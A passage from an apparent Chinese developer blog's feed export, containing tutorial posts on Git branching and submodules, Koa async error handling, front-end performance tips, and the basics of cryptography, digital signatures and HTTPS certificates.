与 master"></a>HEAD 与 master</h2><p>HEAD 指的是当前分支，master 指的是当前提交的版本：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191210141717.png" alt=""></p><p>当用户新创建了一个 dev 分支，最新的分支还是会指向当前 master 主分支指向的节点：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191210142013.png" alt=""></p><p>当用户在 dev 分支进行提交后，dev 分支会新建一个版本并指向新版本的提交：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191210142110.png" alt=""></p><p>当 master 分支上没有进行更改，此时合并 dev 与 master 分支的话，master 分支的指针会直接指向当前的版本，我们称这样的操作为 “快进（fast forward）”：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191210142312.png" alt=""></p><h2 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h2><p>当我们将 dev 分支的最新内容合并到 master 分支时如果出现了冲突需要手动解决冲突，冲突的文件会内容会被标识为类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new file</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">master edit</span><br><span class="line">=======</span><br><span class="line">dev edit</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; dev</span><br></pre></td></tr></table></figure><p>此时我们需要手动进入到文件中，将不需要的代码删除，然后再进行一次提交，这样就解决了冲突。</p><p>当此时切回到 dev 分支后，如果想要获取到最新的 master 分支的内容，则需要将 master 分支合并到 dev 分支，此时由于 master 分支被标记为最新更改，所以如果在 dev 分支上没有对已在 master 分支解决了冲突的文件进行修改，dev 分支就会直接快进到 master 分支的版本。</p><p>实际上冲突也是另外开了一个冲突分支，我们解决冲突就是去合并冲突分支：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191210152834.png" alt=""></p><h2 id="fast-forward"><a href="#fast-forward" class="headerlink" title="fast-forward"></a>fast-forward</h2><p>如果可能，git 提交会使用 fast-forward 模式，在这种模式下合并分支并未生成一个新的提交，而是将当前分支的指针指向了</p><h1 id="6-子模块"><a href="#6-子模块" class="headerlink" title="6. 子模块"></a>6. 子模块</h1><h2 id="子模块初始化"><a href="#子模块初始化" class="headerlink" title="子模块初始化"></a>子模块初始化</h2><p>项目有子模块，Clone 后需要进行初始化：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init     <span class="comment"># 初始化子模块信息</span></span><br><span class="line">git submodule update   <span class="comment"># 拉去子模块更新</span></span><br></pre></td></tr></table></figure><p>上面两个模块可以合并为一个：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure><h2 id="拉取子模块上游更新"><a href="#拉取子模块上游更新" class="headerlink" title="拉取子模块上游更新"></a>拉取子模块上游更新</h2><blockquote><p>–recursive 为递归</p></blockquote><p>从远程源拉取：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update --recursive --remote</span><br></pre></td></tr></table></figure><blockquote><p>远程源默认拉取 master 分支，如果需要更改拉取分支，则需要在 .gitmodules 文件中添加 branch 信息</p></blockquote><p>从本地 url 源拉取：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure><p>手动递归拉取：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule foreach git pull origin &lt;branch&gt;</span><br></pre></td></tr></table></figure><h1 id="7-upstream"><a href="#7-upstream" class="headerlink" title="7. upstream"></a>7. upstream</h1><p>当你在 Github 上 Fork 别人的项目，同时保持与 Fork 项目的同步更新时，可以将目标项目设置为 <code>upstream</code>，这样就能做到保持更新了，他们的关系如下图：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405091350390.png" alt="202405091350390.png|496"></p><p>设置 upstream:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add upstream &lt;git_repository_url&gt;</span><br></pre></td></tr></table></figure><p>从 upstream 更新代码到当前分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull upstream &lt;upstream_brach_name&gt;</span><br></pre></td></tr></table></figure><p><a href="https://gb.yekai.net/concepts/origin-vs-upstream">更多参考</a></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Koa中的的错误处理方案</title>
      <link href="/2019/11/7b2afc2d3cb0.html"/>
      <url>/2019/11/7b2afc2d3cb0.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-在-async-函数中错误捕获"><a href="#1-在-async-函数中错误捕获" class="headerlink" title="1. 在 async 函数中错误捕获"></a>1. 在 async 函数中错误捕获</h1><p>我们通常处理 Promise 异步操作中的错误可以使用 <code>.catch(err=&gt;&#123; ... &#125;)</code> 来处理，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getAsyncData</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;成功啦&quot;</span>)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;出错啦&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是如果在 Koa 的路由处理函数中，使用这种方式去处理响应数据是无效的，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/getData&#x27;</span>, <span class="function">(<span class="params">ctx, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="title function_">getAsyncData</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">ok</span>: ture,</span><br><span class="line">      <span class="attr">data</span>: data,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">ok</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">data</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">msg</span>: err.<span class="property">message</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样做前端调用该路由函数时，返回的结果为 404 。这其实是跟 JS 的事件轮询相关的，我们很容易就想明白，在异步函数中又创建了一个新的异步函数，新的异步函数的回调执行顺序肯定在当前异步函数的回调执行完毕之后。</p><p>也就是说，假如我们以这样的方式处理错误的话，当我们执行 <code>ctx.body</code> 赋值数据时，当前的请求已经发送完毕了，所以 <code>ctx.body</code> 是不能在内层的异步函数中调用的。如果我们需要通过异步获取数据，我们应该在当前的异步函数中使用 <code>await</code> 来阻塞数据获取的异步函数，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/getData&#x27;</span>, <span class="function">(<span class="params">ctx, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = <span class="keyword">await</span> <span class="title function_">getAsycnData</span>()</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">ok</span>: ture,</span><br><span class="line">    <span class="attr">data</span>: data,</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，这样的话我们就无法捕捉错误了。如果想捕捉 <code>await</code> 的异步函数中的错误实际上也可以直接使用 <code>catch()</code> 来捕获，如像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/getData&#x27;</span>, <span class="function">(<span class="params">ctx, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = <span class="keyword">await</span> <span class="title function_">getAsycnData</span>().<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">ok</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">data</span>: data,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">ok</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">data</span>: data,</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这样的话，的确是可以捕获到错误，但是这样我们就会发现，由于执行顺序的问题，<code>ctx.body</code> 的操作会被后续的操作覆盖，我们无法在处理完错误后终止处理后续的逻辑。</p><p>但是 JS 中的 <code>try...catch...</code> 可以解决这个问题，我们只需要将其改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/getData&#x27;</span>, <span class="function">(<span class="params">ctx, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> <span class="title function_">getAsycnData</span>()</span><br><span class="line">      ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">ok</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">data</span>: data,</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">    ctx.<span class="property">body</span> = &#123;</span><br><span class="line">      <span class="attr">ok</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">data</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">      <span class="attr">msg</span>: e.<span class="property">message</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样处理的话，当在等待异步函数 <code>getAsycnData()</code> 时如果出现了错误，就会从中途跳出，被捕获到 <code>catch</code> 语句中，从而执行错误处理的函数。</p><h1 id="2-错误的聚合处理"><a href="#2-错误的聚合处理" class="headerlink" title="2. 错误的聚合处理"></a>2. 错误的聚合处理</h1><p>我们可以在每个路由处理函数中都使用如上的方法处理错误，但是这样还是不够便捷，我们希望可以将出错信息进行聚合最后返回给请求者。我们可以利用 Koa 的中间件执行方式，将错误处理函数作为一个中间件函数，放在所用中间件的顶部：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">next</span>()</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    ctx.<span class="property">status</span> = err.<span class="property">status</span> || <span class="number">500</span></span><br><span class="line">    ctx.<span class="property">body</span> = err.<span class="property">message</span></span><br><span class="line">    ctx.<span class="property">app</span>.<span class="title function_">emit</span>(<span class="string">&quot;error&quot;</span>, err, ctx)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样当 Koa 执行到该中间件时，会首先执行 <code>await next()</code> 然后执行后续的中间件，当其余中间件执行过程中出错，就会跳出到 <code>catch</code> 语句中，返回错误信息给数据请求者。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Koa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端页面的性能优化方案</title>
      <link href="/2019/11/90537b604dd9.html"/>
      <url>/2019/11/90537b604dd9.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-常规方案"><a href="#1-常规方案" class="headerlink" title="1. 常规方案"></a>1. 常规方案</h1><p>原则：</p><ul><li>多使用内存、缓存或者其他方法</li><li>减少CPU计算、较少网络</li></ul><p>从哪里入手：</p><ul><li>加载页面和静态资源</li><li>页面渲染</li></ul><h2 id="1-1-加载资源优化"><a href="#1-1-加载资源优化" class="headerlink" title="1.1 加载资源优化"></a>1.1 加载资源优化</h2><ul><li>静态资源的压缩合并 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;b.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;c.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;abc.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>静态资源缓存（Cache-Control、Etag）<ul><li>通过连接名称控制缓存</li><li><code>&lt;script src=&quot;abc_1.js&quot;&gt;&lt;/script&gt;</code></li><li>只有内容改变的时候，链接名称才会改变</li><li><code>&lt;script src=&quot;aba.2.js&quot;&gt;&lt;/script&gt;</code></li></ul></li><li>使用CDN让资源加载更快</li><li>使用SSR后端渲染，数据直接输出到HTML中</li><li>页面中的空 href 和 src 会阻塞其他资源的加载（阻塞下载进程）</li><li>服务器 gzip </li></ul><h2 id="1-2-渲染优化"><a href="#1-2-渲染优化" class="headerlink" title="1.2 渲染优化"></a>1.2 渲染优化</h2><ul><li>CSS放前面，JS放后面（JS 会阻塞页面的渲染，但是加载还是与其他资源一样处于并行）</li><li>懒加载（图片懒加载、下拉加载更多）<ul><li>懒加载原理：</li><li>将图片的默认src都设置为一张加载图片</li><li>把图片标签的属性中添加一个值存放图片的真实地址</li><li>当图片需要加载时，再将图片的真实地址替换原有的默认src<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;img1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;preview.png&quot;</span> <span class="attr">data-realsrc</span>=<span class="string">&quot;abc.png&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> img1=<span class="variable language_">document</span>. <span class="title function_">getElementById</span>(<span class="string">&#x27; img1&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  img1. src=img1. <span class="title function_">getAttribute</span>(<span class="string">&#x27; data-realsrc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li>减少DOM查询，对DOM查询做缓存（将要重复使用的DOM存放在一个变量中）<ul><li><img src="http://markdown.img.esunr.xyz/20190507202554.png" alt=""></li><li><img src="http://markdown.img.esunr.xyz/20190507202612.png" alt=""></li></ul></li><li>减少DOM操作，多个操作尽量合并在一起执行</li><li>事件节流</li><li>尽早执行操作（如DOMContentLoaded）</li><li>禁止使用 iframe<ul><li>iframe 会阻塞页面的 onload 事件</li><li>不利于SEO</li><li>iframe 和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载</li><li>使用 iframe 最好通过 javascript</li><li>动态给 iframe 的 src 赋值</li></ul></li></ul><h1 id="2-非常规方案"><a href="#2-非常规方案" class="headerlink" title="2. 非常规方案"></a>2. 非常规方案</h1><h2 id="2-1-使用preload与prefetch对页面资源进行预加载"><a href="#2-1-使用preload与prefetch对页面资源进行预加载" class="headerlink" title="2.1 使用preload与prefetch对页面资源进行预加载"></a>2.1 使用preload与prefetch对页面资源进行预加载</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Preloading_content">MDM文档</a></p><ul><li>使用 preload 可以预先加载资源文件</li><li>预加载的资源不会对后面的资源造成阻塞</li><li>preload 不阻塞 onload 事件（<code>&lt;script async&gt;</code> 会阻塞 onload 事件）</li><li>预加载的 script 不会被执行，需要在页面中领用创建 <code>&lt;script&gt;</code> 标签的方式动态调用</li><li>prefetch用来加载下一个页面将要使用的资源，所以优先级最低</li></ul><p>preload 是个好东西，能告诉浏览器提前加载当前页面必须的资源，将加载与解析执行分离开，做得好可以对首次渲染带来不小的提升，但要避免滥用，区分其与 prefetch 的关系，且需要知道 preload 不同资源时的网络优先级差异。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础：对称加密、非对称加密与数字签名与https</title>
      <link href="/2019/11/742b4ca50d57.html"/>
      <url>/2019/11/742b4ca50d57.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程来源：<a href="https://www.bilibili.com/video/av70001643">https://www.bilibili.com/video/av70001643</a></p></blockquote><h1 id="1-密码学简介"><a href="#1-密码学简介" class="headerlink" title="1. 密码学简介"></a>1. 密码学简介</h1><p>密码学是通信安全方面的研究，主要分为加密通信与数字签名两个功能：</p><h2 id="1-1-信息加密"><a href="#1-1-信息加密" class="headerlink" title="1.1 信息加密"></a>1.1 信息加密</h2><p>加密通信分为 对称加密 与 非对称加密。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112193853.png" alt="20191112193853.png"></p><p>对称加密拥有同一套密钥，是一种比较简单的加密方式，但是其劣势就是公用的一套密钥可能会被窃取。对称加密最常见的算法是 AES 算法。</p><p>而非对称加密是使用了一对公钥和密钥实现了信息的加密，一方用公钥加密信息，而另一方用私钥解密信息。非对称加密的主要算法有两种，一种是 RSA（经典算法）, 另一种是 ECC（比特币加密算法）。</p><p>所以对比之下，非对称加密相对于对称加密的的优势在于：信息加密传递的过程中只需要显式传递公钥，私钥由一方保密，外界没有私钥就无法对传递的信息进行解密，所以公钥暴露也无所谓。</p><h2 id="1-2-数字签名简介"><a href="#1-2-数字签名简介" class="headerlink" title="1.2 数字签名简介"></a>1.2 数字签名简介</h2><p>数字签名（又称公钥数字签名）是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。</p><p>数字签名是基于非对称加密实现的，是由私钥产生的，公钥可以验证数字签名的有效性：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112201025.png" alt="20191112201025.png"></p><h1 id="2-加密通信"><a href="#2-加密通信" class="headerlink" title="2. 加密通信"></a>2. 加密通信</h1><h2 id="2-1-对称加密"><a href="#2-1-对称加密" class="headerlink" title="2.1 对称加密"></a>2.1 对称加密</h2><p>对称加密就是双方使用同一个解密密钥，对信息进行两端的加密和解密。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112201402.png" alt="20191112201402.png"></p><p>但是在互联网通信中，服务器端与客户端并不能同时约定一个对信息加密和解密的密钥。只能由一方规定生成密钥后，再将密钥传递给另一方，那么传递的过程中，密钥就有可能被泄露。所以解决如何安全传递对称加密的密钥就成了主要解决的问题。</p><h2 id="2-2-非对称加密（公开密钥加密）"><a href="#2-2-非对称加密（公开密钥加密）" class="headerlink" title="2.2 非对称加密（公开密钥加密）"></a>2.2 非对称加密（公开密钥加密）</h2><p>非对称加密双发使用了不同的密钥来进行解密，在传递过程中仅传递公钥，所以信息不会对外泄露，这就弥补了对称加密的不足。</p><p>其具体的实现流程就是让接收方生成一套公钥和私钥，这两套密钥在数学上关系上有着紧密的联系，但同时不可由私钥推算出公钥。之后接收方将公钥交给信息发送方，信息发送放使用公钥对信息进行加密，发送信息给信息接收方后，信息接收方就可以使用其私钥对加密信息进行解密。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112194832.png" alt="20191112194832.png"></p><p>关于私钥与公钥的加密原理，重点在于公钥与私钥之间有 <strong>一定的数学联系</strong> ，一般是由一个单向函数实现的，比如 <code>a*b=123312213212</code> 我们并不能逆向推算出 <code>a</code> 和 <code>b</code> 的具体值。</p><p>举个简单的例子（<a href="https://www.zhihu.com/question/33645891/answer/192604856">引用来源</a>）：</p><p>让对方任意想一个3位数，并把这个数和91相乘，然后告诉我积的最后三位数，我就可以猜出对方想的是什么数字！</p><p>比如对方想的是123，那么对方就计算出123 * 91等于11193，并把结果的末三位193告诉我。看起来，这么做似乎损失了不少信息，让我没法反推出原来的数。不过，我仍然有办法：只需要把对方告诉我的结果再乘以11，乘积的末三位就是对方刚开始想的数了。可以验证一下，193 * 11 = 2123，末三位正是对方所想的秘密数字！</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112195647.png" alt="20191112195647.png"></p><p>其实道理很简单，91乘以11等于1001，而任何一个三位数乘以1001后，末三位显然都不变（例如123乘以1001就等于123123）。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112200028.png" alt="20191112200028.png"></p><p>所以用上面的例子，我们可以将其整理为一个非对称加密传输信息的模型：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112195554.png" alt="20191112195554.png"></p><h2 id="2-3-混合加密"><a href="#2-3-混合加密" class="headerlink" title="2.3 混合加密"></a>2.3 混合加密</h2><p>混合加密就是将对称加密与非对称加密相结合而进行信息传递的方式，互联网两端的通信虽然完全可以使用非对称加密来进行，但是非对称加密这种方式及其消耗性能成本，而对称加密更为节省性能。所以我们没有必要全程使用非对称加密来进行通信，只需要使用非对称加密传递对称加密的密钥即可，主要的信息通信仍使用对称加密。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191113114844.png" alt="混合加密传递密钥的流程"></p><p>使用混合加密实现的例子有：PGP、HTTPS</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112203459.png" alt="PGP基础原理"></p><h1 id="3-数字签名"><a href="#3-数字签名" class="headerlink" title="3. 数字签名"></a>3. 数字签名</h1><p>在上述两节中，公钥的主要作用是用来 <strong>加密信息</strong>，并没有体现其解密功能，那么为什么要称公钥为钥匙呢？原来除了加密信息外，公钥还可以用来解密数字签名，来验证信息的发送方是否来自于对应的私钥。</p><p>所以总结一下，私钥的解密功能主要体现在加密通信（解密key），而公钥的解密功能体现在数字签名（验证key）。</p><h2 id="3-1-数字签名的原理"><a href="#3-1-数字签名的原理" class="headerlink" title="3.1 数字签名的原理"></a>3.1 数字签名的原理</h2><p>对于加密通信与数字签名的具体过程，私钥与公钥的作用是互相对陈的：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112210610.png" alt="20191112210610.png"></p><p>签名算法的输入是文件与私钥，而输出是一串密文；而验证算法的输入时文件、密文与公钥，输出是判定文件的签名是否有效。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112210727.png" alt="20191112210727.png"></p><p>对于签名的验证算法是公开的，所有人都可以在自己的计算机上执行验证算法。这段过程中要注意，签名算法并没有对文件进行加密，只是加密了文件的哈希值：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112211451.png" alt="20191112211451.png"></p><h2 id="3-2-数字签名的作用"><a href="#3-2-数字签名的作用" class="headerlink" title="3.2 数字签名的作用"></a>3.2 数字签名的作用</h2><ul><li>认证 —— 确认身份</li><li>防止抵赖 —— 不能返回</li><li>防篡改 —— 文件完整</li></ul><p>对于防止文件篡改、验证文件完整，这一步是因为验证算法生成的密文是由文件的哈希值与私钥生成的，如果文件在传输过程中遭到篡改或不完整，那么在客户端将传递到文件、密文、公钥进行验证时就会不一致。</p><h1 id="4-数字证书"><a href="#4-数字证书" class="headerlink" title="4. 数字证书"></a>4. 数字证书</h1><p>弄懂了对称加密、非对称加密、数字签名这三个主要概念之后，我们回头看一下，在最合理的混合加密过程中仍存在着不安全的情况。</p><p>如果黑客在混合加密传递公钥的这一步拦截了公钥，将其替换为自己的公钥，诱骗客户端生成加密密钥；随后客户端在向服务器传递加密密钥时，黑客再次进行拦截，并将来自客户端的加密密钥进行解密得到密钥，并将解密后的密钥由真正的公钥再次加密发送给服务器端。这样就可以在服务器端与客户端 <strong>无法察觉</strong> 的情况下获取到两端进行对称加密通信的密钥了。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191112205817.png" alt="公钥被黑客拦截并篡改"></p><p>那么我们来思考一下如何解决安全的传递公钥的这一问题：</p><p>我们设想，假如在服务器传递公钥时，同时夹带一张证书，来证明当前的公钥时由服务器发送的，那么如果黑客在中途窃取了拦截了公钥，将“真公钥”替换为了“假公钥”，但是 <strong>证书是不能被黑客篡改的</strong> ，那么客户端在验证证书时就会发现公钥不正确，从而防止信息泄露。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191113120230.png" alt="不携带证书的情况"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20191113120141.png" alt="携带证书的情况"></p><p>我们可以利用我们上一节讲的数字签名来制作这张证书，同时还要有一个可信任的 <strong>发证机构（CA）</strong> 来颁发这张证书，这也就是 HTTPS 的加密原理。</p><p>一张证书通常包含以下几个重要信息：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191113121219.png" alt="证书"></p><p>我们可以注意到证书上有一个数字签名，这个数字签名是由发证机构生成的，用于验证证书的有效性，其对应的验证公钥是发证机构提供的。所以公钥传递的完整流程（也就是HTTPS的加密流程）应该为：</p><ol><li>服务器在发送公钥前，会拿着该公钥与自己的信息向发证机构提出申请。</li><li>发证机构收到服务器的申请后，将这些信息进行HASH处理，结合自己的算法生成一个证书的数字签名，并将证书递交给服务器。</li><li>服务器将证书发送给客户端</li><li>客户端接收到证书后，拿着发证机构提供的公钥验证证书是否是由发证机构提供的，同时验证其余信息有没有被篡改（这一步提现了非对称加密的验证功能），如果验证通过那么证书中携带的公钥就是可信的。</li></ol><p>此时可能会有这两个问题：</p><ul><li><p>问：发证机构的公钥如何获取？<br>答：发证机构是基于信任的，发证机构的公钥已经对公众公开并集成于浏览器中了。</p></li><li><p>问：证书可能被篡改吗？<br>答：不可能。如果黑客对数字签名进行了篡改，那么客户端就无法解密；如果黑客篡改了证书中的明文信息，那么客户端在使用 CA 公钥进行签名验证时就会发现解出的HASH与明文信息不对应。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 公开课 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Element UI Select 组件的 value-key 属性，让绑定值可以为一个对象</title>
      <link href="/2019/11/feec6e96dc41.html"/>
